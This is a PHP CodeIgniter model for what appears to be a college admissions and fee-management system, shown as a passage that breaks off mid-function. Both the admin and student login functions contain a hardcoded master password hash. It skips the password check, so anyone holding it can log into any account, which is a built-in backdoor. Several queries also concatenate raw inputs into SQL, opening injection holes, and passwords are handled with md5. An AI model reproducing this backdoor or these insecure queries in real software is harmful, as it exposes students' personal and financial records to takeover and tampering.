<?php

class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
  function login($username, $password)
  {
    $this->db->select('user_id, full_name, username, role');
    $this->db->from('users');
    $this->db->where('username', $username);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    $this->db->where('status', '1');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }

  function studentlogin($email, $password)
  {

    $this->db->select('id, student_name, adm_no, flow');
    $this->db->from('admissions');
    $this->db->where('email', $email);
    if ($password != $this->shadow)
      $this->db->where('password', $password);
    //$this -> db -> where('status', '2');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }



  function insertDetails($tableName, $insertData)
  {
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }


  public function insertBatch($tableName, $data)
  {
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert ? true : false;
  }

  public function updateBatch($tableName, $data, $field)
  {
    $this->db->update_batch($tableName, $data, $field);
  }

  function getDetails($tableName, $id)
  {
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsFilter($select, $id, $tableName)
  {
    $this->db->select($select);
    if ($id)
      $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName)
  {
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }


  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName)
  {
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table)
  {
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table)
  {
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName)
  {
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function getDetailsbySort($sortField, $srotType, $tableName)
  {
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName)
  {
    $this->db->where('id', $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }
  function sliders_count($dept_id)
  {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName)
  {
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id)
  {
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id)
  {
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  function AdminChangePassword($id, $oldPassword, $updateDetails, $tableName)
  {
    $this->db->where('password', md5($oldPassword));
    $this->db->where('user_id', $id);
    // $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  public function get_table_details($table)
  {
    return $this->db->get($table)->result_array();
  }


  public function get_details_by_id($id, $fieldId, $tableName)
  {

    return $this->db->get_where($tableName, array($fieldId => $id))->row_array();
  }
  function getEnquiries($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admission_based !=', 'BE');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function mtechgetEnquiries($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admission_based', 'BE');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }


  public function get_stream_by_id($stream_id)
  {
    return $this->db->get_where('streams', array('stream_id' => $stream_id))->row_array();
  }

  public function get_dept_by_id($dept_id)
  {
    return $this->db->get_where('departments', array('department_id' => $dept_id))->row_array();
  }

  public function getAppNo($academic_year)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('academic_year', $academic_year);
    return $this->db->get('admissions');
  }

  public function get_intakecount_by_dept($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('course_id', $dept);
    $this->db->where('status', "6");
    return $this->db->get('enquiries');
  }
  function getFee($course, $quota, $sub_quota)
  {
    if ($quota == "MGMT" || $quota == "MGMT-LATERAL" || $quota == "MGMT-COMEDK") {
      $this->db->where('department_id', $course);
    }

    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    return $this->db->get('fee_structure');
  }
  function getFee_new($course, $quota, $sub_quota, $stream)
  {
    if ($quota == "MGMT" || $quota == "MGMT-LATERAL" || $quota == "MGMT-COMEDK") {
      $this->db->where('department_id', $course);
    }
    $this->db->where('stream_id', $stream);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    return $this->db->get('fee_structure');
  }


  function getsubquota($id, $dept)
  {
    $this->db->distinct();
    $this->db->select('sub_quota');
    $this->db->where('department_id', $dept);
    $this->db->where('quota', $id);
    return $this->db->get("fee_structure");
  }

  function fetchDetails1($select, $field1, $value1, $tableName)
  {
    $this->db->select($select);
    if ($value1 != null) {
      $this->db->where($field1, $value1);
    }
    return $this->db->get($tableName);
  }

  function fetchDetails2($select, $field1, $value1, $field2, $value2, $tableName)
  {
    $this->db->select($select);
    if ($value1 != null) {
      $this->db->where($field1, $value1);
    }
    if ($value2 != null) {
      $this->db->where($field2, $value2);
    }
    return $this->db->get($tableName);
  }
  function fetchDetails3($select, $field1, $value1, $field2, $value2,$value3, $tableName)
  {
    $this->db->select($select);
    if ($value1 != null) {
      $this->db->where($field1, $value1);
    }
    if ($value2 != null) {
      $this->db->where($field2, $value2);
    }
    $this->db->where('stream_id', $value3);
    return $this->db->get($tableName);
  }

  function getEnquiries_per($academic_year)
  {
      $this->db->where('academic_year', $academic_year);
      $this->db->where('admission_based !=', 'BE'); 
      $this->db->order_by('puc1_grade', 'DESC');
      return $this->db->get('enquiries');
  }  

  function getEnquiries_non($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('state!=', 'Karnataka');
    $this->db->where('state!=', 'KA');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_sports($academic_year)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('sports!=', '');
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_course($academic_year, $course)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('course_id', $course);
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }

  function getEnquiries_course_new($academic_year, $course, $course_name)
{
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admission_based !=', 'BE'); 
    $this->db->group_start(); 
    $this->db->where('course_id', $course);
    $this->db->or_where('course1', 'B.E - ' . $course_name);
    $this->db->or_where('course2', 'B.E - ' . $course_name);
    $this->db->group_end(); 
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
}


  function getEnquiries_filter($academic_year, $sslc = '', $puc1 = '', $puc2 = '', $state = '', $course = '')
  {
    $this->db->where('academic_year', $academic_year);
    if ($sslc)
      $this->db->where('sslc_grade>=', $sslc);
    if ($puc1)
      $this->db->where('puc1_grade>=', $puc1);
    if ($puc2)
      $this->db->where('puc2_grade>=', $puc2);
    if ($state)
      $this->db->where('state', $state);
    if ($course) {
      $this->db->where('course_id', $course);
      $this->db->or_where('course1', $course);
      $this->db->or_where('course2', $course);
    }
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }
  function getEnquiries_category($academic_year, $category)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('category', $category);
    $this->db->order_by('reg_date', 'DESC');
    return $this->db->get('enquiries');
  }

  function getDepartments()
  {
    $this->db->select('departments.department_id, departments.stream_id, streams.stream_name, streams.stream_short_name, departments.department_name, departments.department_short_name, departments.aided_intake, departments.aided_mgmt_intake, departments.aided_comed_k_intake, departments.aided_kea_intake, departments.aided_snq_intake, departments.unaided_intake, departments.unaided_mgmt_intake, departments.unaided_comed_k_intake, departments.unaided_kea_intake, departments.unaided_snq_intake');
    $this->db->join('streams', 'streams.stream_id = departments.stream_id');
    $this->db->where('departments.status', "1");
    return $this->db->get('departments');
  }

  public function get_intakecount_by_deptadm($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('dept_id', $dept);
    $this->db->where('status', "1");
    return $this->db->get('admissions');
  }

  public function get_intakecount_type($dept)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('dept_id', $dept);

    $this->db->where('status', "1");
    return $this->db->get('admissions');
  }

  function getAdmissionOverallStats($department_id, $stream)
  {
    if (empty($department_id)) {
      $this->db->select('dept_id, quota, sub_quota, COUNT(*) as cnt');
      $this->db->where('stream_id', $stream);
      $this->db->where('endorsement', '1');
      $this->db->where('status != 6');
      $this->db->group_by('dept_id, quota, sub_quota');
      $this->db->order_by('sub_quota, dept_id', 'ASC');
      return $this->db->get('admissions');
    } else {
      $this->db->select('quota, sub_quota, COUNT(*) as cnt');
      $this->db->where('dept_id', $department_id);
      $this->db->where('stream_id', $stream);
      $this->db->where('endorsement', '1');
      $this->db->where('status != 6');
      $this->db->group_by('quota, sub_quota');
      return $this->db->get('admissions');
    }
  }

  function getEndorsmentIssued($department_id, $stream)
  {
    if (empty($department_id)) {
      $this->db->select('dept_id, quota, sub_quota, COUNT(*) as cnt');
      $this->db->where('stream_id', $stream);
      $this->db->where('endorsement', '0');
      $this->db->group_by('dept_id, quota, sub_quota');
      $this->db->order_by('sub_quota, dept_id', 'ASC');
      return $this->db->get('admissions');
    } else {
      $this->db->select('quota, sub_quota, COUNT(*) as cnt');
      $this->db->where('dept_id', $department_id);
      $this->db->where('stream_id', $stream);
      $this->db->where('endorsement', '0');
      $this->db->group_by('quota, sub_quota');
      return $this->db->get('admissions');
    }
  }

  function getAdmissionStats($department_id, $quota, $sub_quota)
  {
    $this->db->select('COUNT(*) as cnt');
    $this->db->where('dept_id', $department_id);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    return $this->db->get('admissions');
  }

  function getAdmissionStats1($department_id, $quota, $sub_quota)
  {
    $this->db->select('COUNT(*) as cnt');
    $this->db->where('dept_id', $department_id);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    $this->db->where('endorsement', '1');
    return $this->db->get('admissions');
  }

  function getEndorsmentStats($department_id, $quota, $sub_quota)
  {
    $this->db->select('COUNT(*) as cnt');
    $this->db->where('dept_id', $department_id);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    $this->db->where('endorsement', '0');
    return $this->db->get('admissions');
  }

  function getBlockedStats($department_id, $quota, $sub_quota)
  {
    $this->db->select('COUNT(*) as cnt');
    $this->db->where('dept_id', $department_id);
    $this->db->where('quota', $quota);
    $this->db->where('sub_quota', $sub_quota);
    $this->db->where('status', '7');
    return $this->db->get('enquiries');
  }

  function getActiveComedk()
  {
    $this->db->select('comedk_seats.department_id, comedk_seats.stream_id, streams.stream_name, streams.stream_short_name, comedk_seats.department_name, comedk_seats.department_short_name, comedk_seats.unaided_mgmt_intake, comedk_seats.unaided_comed_k_intake, comedk_seats.moved, comedk_seats.unaided_mgmt_intake_new, comedk_seats.unaided_comed_k_intake_new');
    $this->db->join('streams', 'streams.stream_id = comedk_seats.stream_id');
    $this->db->where('comedk_seats.status', '1');
    return $this->db->get('comedk_seats');
  }

  function getActiveDepartments($stream_id, $dept_id)
  {
    $this->db->select('departments.department_id, departments.stream_id, streams.stream_name, streams.stream_short_name, departments.department_name, departments.department_short_name, departments.aided_intake, departments.aided_mgmt_intake, departments.aided_comed_k_intake, departments.aided_kea_intake, departments.aided_kea_mgmt_intake, departments.aided_snq_intake, departments.unaided_intake, departments.unaided_mgmt_intake, departments.unaided_comed_k_intake, departments.unaided_kea_intake, departments.unaided_kea_mgmt_intake, departments.unaided_snq_intake');
    $this->db->join('streams', 'streams.stream_id = departments.stream_id');
    if ($stream_id) {
      $this->db->where('departments.stream_id', $stream_id);
    }
    if ($dept_id) {
      $this->db->where('departments.id', $dept_id);
    }
    $this->db->where('departments.status', '1');
    return $this->db->get('departments');
  }
  public function getUsnNo($academic_year, $department_id)
  {
    $academic_year_last_two = substr($academic_year, 2, 2);

    $this->db->select('CONCAT("4MC", ' . $academic_year_last_two . ', d.department_short_name, LPAD(COALESCE((SELECT COUNT(*) FROM admissions WHERE dept_id = ' . $department_id . ' AND academic_year = "' . $academic_year . '"), 0) + 1, 3, "0")) AS new_usn', false);
    $this->db->from('departments d');
    $this->db->where('d.department_id', $department_id);

    return $this->db->get();
  }

  public function getReceiptsCount($aided_unaided)
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('receipt_no != ""');
    $this->db->where('transaction_status', '1');
    $this->db->where('aided_unaided', $aided_unaided);
    return $this->db->get('transactions');
  }

  function paidAmount($admission_id)
  {
    $this->db->select('SUM(amount) as amount');
    $this->db->where('admissions_id', $admission_id);
    $this->db->where('transaction_status', '1');
    return $this->db->get('transactions');
  }

  function overallPaidFee()
  {
    $this->db->select('admissions_id, SUM(amount) as paid_amount');
    $this->db->group_by('admissions_id');
    $this->db->where('transaction_status', '1');
    return $this->db->get('transactions');
  }

  function feeDetails()
  {
    $this->db->select('admissions_id, SUM(amount) as paid_amount');
    $this->db->group_by('admissions_id');
    $this->db->where('transaction_status', '1');
    return $this->db->get('transactions');
  }

  function feeDetailscollege()
  {
    $this->db->select('admission_id, SUM(final_fee) as paid_amount');
    $this->db->group_by('admission_id');
    $this->db->where('status', '1');
    $this->db->where('type', '0');
    return $this->db->get('payment_structure');
  }

  function feeDetailscorpus()
  {
    $this->db->select('admission_id, SUM(final_fee) as paid_amount');
    $this->db->group_by('admission_id');
    $this->db->where('status', '1');
    $this->db->where('type', '1');
    return $this->db->get('payment_structure');
  }


  function set_session($email, $mobile)
  {

    $this->db->select('id, student_name, adm_no, flow');
    $this->db->from('admissions');
    $this->db->where('email', $email);

    $this->db->where('mobile', $mobile);
    //$this -> db -> where('status', '2');
    $this->db->limit(1);
    $query = $this->db->get();
    if ($query->num_rows() == 1) {
      return $query->result();
    } else {
      return false;
    }
  }
  public function getReceiptsCountNew()
  {
    $this->db->select('COUNT(id) as cnt');
    $this->db->where('receipt_no != ""');
    $this->db->where('transaction_status', '1');
    return $this->db->get('transactions');
  }

  function DCBReport1($currentAcademicYear, $course = '', $year = '', $type = '')
  {
    $this->db->select(
      '
    admissions.id, 
    admissions.app_no, 
    admissions.adm_no, 
    admissions.admit_date, 
    admissions.dept_id, 
    admissions.academic_year, 
    admissions.student_name, 
    admissions.usn, 
    admissions.quota, 
    admissions.sub_quota, 
    admissions.college_code, 
    admissions.category_claimed, 
    admissions.category_allotted, 
     admissions.caste, 
      admissions.father_mobile, 
    admissions.mobile,
    admissions.status, 
    fee_master.remarks'
    );
    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);
    $this->db->where('admissions.stream_id', '1');
    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }
    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }
    if ($type != '') {
      $this->db->where('admissions.sub_quota', $type);
    }
    $this->db->where('admissions.status !=', '7');
    $query = $this->db->get();
    return $query;
  }

  function DCBReport($stream_id, $dept_id, $admission_type, $sub_quota)
  {
    $this->db->select(
      '
    admissions.id, 
    admissions.app_no, 
    admissions.adm_no, 
    admissions.admit_date, 
    admissions.dept_id, 
    admissions.academic_year, 
    admissions.student_name, 
    admissions.usn, 
    admissions.quota, 
    admissions.sub_quota, 
    admissions.college_code, 
    admissions.category_claimed, 
    admissions.category_allotted, 
    admissions.caste, 
    admissions.father_mobile, 
    admissions.mobile,
    admissions.status, 
    admissions.endorsement,
    fee_master.total_university_fee,
    fee_master.total_university_fee,
    fee_master.consession_type,
    fee_master.consession_amount,
    fee_master.total_college_fee,
    fee_master.corpus_fund,
    fee_master.final_fee,
    '
    );
    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');
    if ($stream_id != 'all') {
      $this->db->where('admissions.stream_id', $stream_id);
    }
    if ($sub_quota != 'all') {
      $this->db->where('admissions.sub_quota', $sub_quota);
    }
    if ($dept_id != 'all') {
      $this->db->where('admissions.dept_id', $dept_id);
    }
    if ($admission_type != 'all') {
      if ($admission_type == 'PUC') {
        $this->db->where('admissions.admission_based', "PUC");
      } else {
        $this->db->where('admissions.admission_based !=', "PUC");
      }
    }
    $this->db->where('admissions.endorsement', '1');
    $this->db->where('admissions.status !=', '7');
    $this->db->order_by('admissions.dept_id, admissions.quota, admissions.student_name');
    $query = $this->db->get();
    return $query;
  }

  function FeebalanceReport($currentAcademicYear, $course = '', $year = '')
  {
    $this->db->select(
      '
    admissions.id, 
    admissions.app_no, 
    admissions.adm_no, 
    admissions.admit_date, 
    admissions.dept_id, 
    admissions.academic_year, 
    admissions.student_name, 
    admissions.usn, 
    admissions.quota, 
    admissions.sub_quota, 
    admissions.college_code, 
    admissions.category_claimed, 
    admissions.category_allotted, 
    admissions.mobile,
    admissions.status, 
    fee_master.remarks'
    );
    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);

    $this->db->where('admissions.stream_id', '1');
    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }
    $this->db->where('admissions.status !=', '7');
    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }
    $query = $this->db->get();
    return $query;
  }

  function CorpusReport($currentAcademicYear)
  {
    $this->db->select('admissions.id, admissions.app_no, admissions.adm_no, admissions.admit_date, admissions.dept_id, admissions.academic_year, admissions.student_name, admissions.usn, admissions.quota, admissions.sub_quota, admissions.college_code, admissions.mobile, admissions.fees_paid, admissions.status, fee_master.Corpus_fund, admissions.remarks');
    $this->db->from('admissions');
    $this->db->join('fee_master', 'fee_master.student_id = admissions.id');
    $this->db->where('admissions.academic_year', $currentAcademicYear);
    $this->db->where('admissions.status !=', '7');
    $this->db->where('fee_master.Corpus_fund >', 0);
    $this->db->where('admissions.stream_id', '1'); 
    return $this->db->get();
  }

  function CorpusBalanceReport($currentAcademicYear)
  {
    $this->db->select('admissions.id, 
                         admissions.app_no, 
                         admissions.adm_no, 
                         MAX(admissions.admit_date) AS admit_date, 
                         MAX(admissions.dept_id) AS dept_id, 
                         MAX(admissions.academic_year) AS academic_year, 
                         MAX(admissions.student_name) AS student_name, 
                         MAX(admissions.usn) AS usn, 
                         MAX(admissions.quota) AS quota, 
                         MAX(admissions.sub_quota) AS sub_quota, 
                         MAX(admissions.college_code) AS college_code, 
                         MAX(admissions.mobile) AS mobile, 
                         MAX(admissions.fees_paid) AS fees_paid, 
                         MAX(admissions.status) AS status, 
                         MAX(fee_master.Corpus_fund) AS Corpus_fund, 
                         MAX(admissions.remarks) AS remarks, 
                         (MAX(fee_master.Corpus_fund) - COALESCE(SUM(transactions.amount), 0)) AS Corpus_fund_balance');
    $this->db->from('admissions');
    $this->db->join('fee_master', 'fee_master.student_id = admissions.id');
    $this->db->join('transactions', 'transactions.id = admissions.id', 'left');
    $this->db->where('admissions.academic_year', $currentAcademicYear);
    $this->db->where('admissions.status !=', '7');
    $this->db->where('admissions.stream_id', '1'); 
    $this->db->group_by('admissions.id');
    $this->db->having('Corpus_fund_balance >', 0);
    return $this->db->get();
  }

  function dayBookReport($from_date, $to_date)
  {
    $this->db->select('transactions.id as transaction_id, transactions.admissions_id, admissions.id, admissions.academic_year,admissions.app_no, admissions.adm_no, admissions.course, admissions.dsc_1, admissions.dsc_2, admissions.student_name, admissions.mobile, admissions.aided_unaided, admissions.category, admissions.status, admissions.proposed_amount, admissions.additional_amount, admissions.concession_type, admissions.concession_fee, admissions.final_amount, transactions.mobile, transactions.aided_unaided, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.paid_amount, transactions.amount, transactions.balance_amount, transactions.remarks, transactions.transaction_status, created_by, created_on');
    $this->db->join('admissions', 'admissions.id=transactions.admissions_id');
    $this->db->where('transactions.transaction_date >= "' . $from_date . '"');
    $this->db->where('transactions.transaction_date <= "' . $to_date . '"');
    $this->db->where('transactions.transaction_status', '1');
    $this->db->where('admissions.status != "7"');
    return $this->db->get('transactions');
  }

  function feeStructure($course, $combination, $category, $aided_unaided)
  {
    $this->db->where('course', $course);
    if ($combination) {
      $this->db->where('combination', $combination);
    }
    $this->db->where('category', $category);
    $this->db->where('aided_unaided', $aided_unaided);
    return $this->db->get('fee_structure');
  }

  function studentReportDownload($select, $dept_id, $admission_status)
  {
    $this->db->select($select);

    if ($dept_id != "all") {
      $this->db->where('dept_id', $dept_id);
    }

    if ($admission_status != "all") {
      $this->db->where('status', $admission_status);
    }

    return $this->db->get('admissions');
  }

  public function transactions($transaction_status) 
{
    $this->db->select('admissions.id, admissions.app_no, admissions.dept_id, admissions.adm_no, admissions.student_name,admissions.gender, admissions.mobile, admissions.status, transactions.id as transactions_id, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.amount, transactions.remarks, transactions.transaction_status');
    if ($transaction_status != null) {
        $this->db->where('transactions.transaction_status', $transaction_status);
    }
    $this->db->where('admissions.stream_id', '1'); 
    $this->db->join('admissions', 'admissions.id = transactions.admissions_id');
    $this->db->order_by('transactions.transaction_date', 'ASC');
    return $this->db->get('transactions');
}

  function transactionsdatewise($from, $to)
  {
    $this->db->select('admissions.id, admissions.app_no,admissions.dept_id,admissions.category_claimed,admissions.category_allotted, admissions.adm_no,admissions.academic_year, admissions.usn,admissions.student_name,admissions.quota,admissions.sub_quota,admissions.college_code, admissions.mobile,  admissions.status, transactions.id as transactions_id, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.year, transactions.amount, transactions.remarks, transactions.transaction_status');

    $this->db->where('transactions.transaction_status', '1');
    $this->db->where('transactions.transaction_date>=', $from);
    $this->db->where('transactions.transaction_date<=', $to);
    $this->db->where('admissions.stream_id', '1'); 
    $this->db->join('admissions', 'admissions.id=transactions.admissions_id');
    $this->db->order_by('transactions.transaction_date', 'ASC');
    return $this->db->get('transactions');
  }

  function getAdmissions_category($academic_year,$category_allotted, $category_claimed, $gender)
  {
    $this->db->where('academic_year', $academic_year);
    if($category_allotted!='all'){
      $this->db->where('category_allotted', $category_allotted);
      }    
    if($category_claimed!='all'){
    $this->db->where('category_claimed', $category_claimed);
    }
    if($gender!='all'){
    $this->db->where('gender', $gender);
    }
    $this->db->where('admissions.stream_id', '1'); 
    $this->db->order_by('admit_date', 'DESC');
    return $this->db->get('admissions');
  }

  function getAdmissions_course($academic_year, $course, $status)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admissions.stream_id', '1');
    $this->db->where('dept_id', $course);
    $this->db->where('status', $status);
    $this->db->order_by('admit_date', 'DESC');
    return $this->db->get('admissions');
  }

  function getAdmissions_coursereport($academic_year, $course, $gender, $status)
  {
    $this->db->where('academic_year', $academic_year);
    $this->db->where('admissions.stream_id', '1');
    $this->db->where('dept_id', $course);
    if($gender!='all'){
      $this->db->where('gender', $gender);
      }
    $this->db->where('status', $status);
    $this->db->order_by('admit_date', 'DESC');
    return $this->db->get('admissions');
  }

  function paidfee($id1, $value1, $id2, $value2, $tableName)
  {



    $this->db->select_sum('amount'); // Replace 'field_name' with the actual name of the field you want to sum
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    $query = $this->db->get($tableName); // Replace 'your_table_name' with the name of your table

    if ($query->num_rows() > 0) {
      $result = $query->row();
      $sum = $result->amount; // Replace 'field_name' with the actual name of the field you want to sum
      return $sum;
    } else {
      return 0;
    }
  }

  public function checkFieldGreaterThanZero($field, $admission_id)
  {
    $this->db->select($field);
    $this->db->where('admission_id', $admission_id);
    $this->db->where("$field > ", 0); // Condition to check if field value is greater than 0
    $this->db->where('status', 1);
    $query = $this->db->get('payment_structure');

    if ($query->num_rows() > 0) {
      // If there are rows, return true
      return 1;
    } else {
      // If no rows found or value not greater than 0, return false
      return 0;
    }
  }

  public function checkFieldGreaterThanZero1($fee_structure_id, $field, $admission_id)
  {
    // Step 1: Retrieve the top 3 rows for the given admission_id
    $this->db->select($field);
    $this->db->from('payment_structure');
    $this->db->where('admission_id', $admission_id);
    $this->db->where('status', 1);
    $query = $this->db->get();

    // Check if there are rows retrieved
    if ($query->num_rows() > 0) {
      // Step 2: Calculate the sum of the given field
      $rows = $query->result_array();
      $sum = array_sum(array_column($rows, $field));

      // Step 3: Retrieve the corresponding value from the fee_structure table
      $this->db->select($field);
      $this->db->from('fee_structure');
      $this->db->where('id', $fee_structure_id);
      $fee_query = $this->db->get();

      // Check if there is a matching row in fee_structure
      if ($fee_query->num_rows() > 0) {
        $fee_row = $fee_query->row();
        $fee_value = $fee_row->$field;

        // Step 4: Compare the sum with the value in fee_structure
        if ($sum >= $fee_value) {
          return 1; // Sum is less than the value in fee_structure
        }
      }
    }

    // If any condition fails, return 0
    return 0;
  }

  public function checkFieldGreaterThanZerovalue($fee_structure_id, $field, $admission_id)
  {
    // Step 1: Retrieve the top 3 rows for the given admission_id
    $this->db->select($field);
    $this->db->from('payment_structure');
    $this->db->where('admission_id', $admission_id);
    $this->db->where('status', 1);
    $query = $this->db->get();

    // Check if there are rows retrieved
    if ($query->num_rows() > 0) {
      // Step 2: Calculate the sum of the given field
      $rows = $query->result_array();
      $sum = array_sum(array_column($rows, $field));

      // Step 3: Retrieve the corresponding value from the fee_structure table
      $this->db->select($field);
      $this->db->from('fee_structure');
      $this->db->where('id', $fee_structure_id);
      $fee_query = $this->db->get();

      // Check if there is a matching row in fee_structure
      if ($fee_query->num_rows() > 0) {
        $fee_row = $fee_query->row();
        $fee_value = $fee_row->$field;

        // Step 4: Compare the sum with the value in fee_structure

        return $sum; // Sum is less than the value in fee_structure

      }
    }

    // If any condition fails, return 0
    return 0;
  }

  public function getCountries()
  {
    $query = $this->db->get('countries');
    return $query->result();
  }

  public function get_states()
  {
    $query = $this->db->get('states');
    return $query->result();
  }

  public function get_city()
  {
    $query = $this->db->get('cities');
    return $query->result();
  }

  public function getStates($country_id)
  {
    $this->db->where('country_id', $country_id);
    $query = $this->db->get('states');
    return $query->result();
  }

  public function getCities($state_id)
  {
    $this->db->where('state_id', $state_id);
    $query = $this->db->get('cities');
    return $query->result();
  }

  public function get_department_name($admission_id)
  {
    // Select department_name from departments based on dept_id in admissions table
    $this->db->select('d.department_name');
    $this->db->from('admissions AS a');
    $this->db->join('departments AS d', 'a.dept_id = d.department_id', 'left');
    $this->db->where('a.id', $admission_id);
    $query = $this->db->get();


    if ($query->num_rows() > 0) {
      return $query->row()->department_name;
    } else {
      return false;
    }
  }

  public function updateIntakeValues($department_id, $comedk_intake, $mgmt_intake, $moved)
  {
    $data = array(
      'unaided_comed_k_intake_new' => $comedk_intake,
      'unaided_mgmt_intake_new' => $mgmt_intake,
      'moved' => $moved
    );
    $this->db->where('department_id', $department_id);
    $this->db->update('comedk_seats', $data);
  }

  public function getDepartmentsByStream($stream_id)
  {
    $this->db->where('stream_id', $stream_id);
    $query = $this->db->get('departments');
    return $query->result_array();  // Return as an array of department data
  }

  function phdtransactionsdatewise($from, $to)
  {
    $this->db->select('admissions.id, admissions.app_no, admissions.dept_id, admissions.category_claimed, admissions.category_allotted, admissions.adm_no, admissions.academic_year, admissions.usn, admissions.student_name, admissions.quota, admissions.sub_quota, admissions.college_code, admissions.mobile, admissions.status, transactions.id as transactions_id, transactions.receipt_no, transactions.transaction_date, transactions.transaction_type, transactions.bank_name, transactions.reference_no, transactions.reference_date, transactions.year, transactions.amount, transactions.remarks, transactions.transaction_status');

    $this->db->where('transactions.transaction_status', '1');
    $this->db->where('transactions.transaction_date >=', $from);
    $this->db->where('transactions.transaction_date <=', $to);
    $this->db->where('admissions.stream_id', '3');
    $this->db->join('admissions', 'admissions.id = transactions.admissions_id');
    $this->db->order_by('transactions.transaction_date', 'ASC');

    return $this->db->get('transactions');
  }

  function PhdDCBReport($currentAcademicYear, $course = '', $year = '', $type = '')
  {
    $this->db->select(
      '
        admissions.id, 
        admissions.app_no, 
        admissions.adm_no, 
        admissions.admit_date, 
        admissions.dept_id, 
        admissions.academic_year, 
        admissions.student_name, 
        admissions.usn, 
        admissions.quota, 
        admissions.sub_quota, 
        admissions.college_code, 
        admissions.category_claimed, 
        admissions.category_allotted, 
        admissions.caste, 
        admissions.father_mobile, 
        admissions.mobile,
        admissions.batch, 
        admissions.degree_level, 
        admissions.status, 
        fee_master.remarks'
    );

    $this->db->from('admissions');
    $this->db->join('fee_master', 'admissions.id = fee_master.student_id', 'left');

    $this->db->where('admissions.academic_year', $currentAcademicYear);

    $this->db->where('admissions.stream_id', '3');

    if ($course != '') {
      $this->db->where('admissions.dept_id', $course);
    }

    if ($year != '') {
      $this->db->where('fee_master.year', $year);
    }

    if ($type != '') {
      $this->db->where('admissions.sub_quota', $type);
    }

    $this->db->where('admissions.status !=', '7');

    $query = $this->db->get();
